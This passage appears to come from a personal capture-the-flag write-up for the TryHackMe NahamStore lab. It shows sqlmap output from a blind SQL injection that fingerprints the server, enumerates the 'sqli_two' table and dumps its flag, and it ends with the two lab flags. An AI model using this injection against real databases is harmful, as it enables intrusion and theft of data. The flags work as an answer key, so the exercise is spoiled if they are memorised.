1
-----------------------------146320265839157975802094687199--
---
[00:29:40] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.14.0
back-end DBMS: MySQL >= 5.0.12
[00:29:40] [INFO] fetching columns for table 'sqli_two' in database 'nahamstore'
[00:29:40] [INFO] resumed: 2
[00:29:40] [INFO] resumed: id
[00:29:40] [INFO] resumed: flag
[00:29:40] [INFO] fetching entries for table 'sqli_two' in database 'nahamstore'
[00:29:40] [INFO] fetching number of entries for table 'sqli_two' in database 'nahamstore'
[00:29:40] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[00:29:40] [INFO] retrieved: 
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
1
[00:29:42] [INFO] retrieved: {212ec3b036925a38b7167cf9f0243015}
[00:30:39] [INFO] retrieved: 1
Database: nahamstore
Table: sqli_two
[1 entry]
+----+------------------------------------+
| id | flag                               |
+----+------------------------------------+
| 1  | {212ec3b036925a38b7167cf9f0243015} |
+----+------------------------------------+

[00:30:41] [INFO] table 'nahamstore.sqli_two' dumped to CSV file '/home/witty/.local/share/sqlmap/output/nahamstore.thm/dump/nahamstore/sqli_two.csv'
[00:30:41] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/nahamstore.thm'

[*] ending @ 00:30:41 /2023-03-24/

Was a long journey! 

```

Flag 1  

*{d890234e20be48ff96a2f9caab0de55c}*

Flag 2 ( blind )  

*{212ec3b036925a38b7167cf9f0243015}*

[[Tempest]]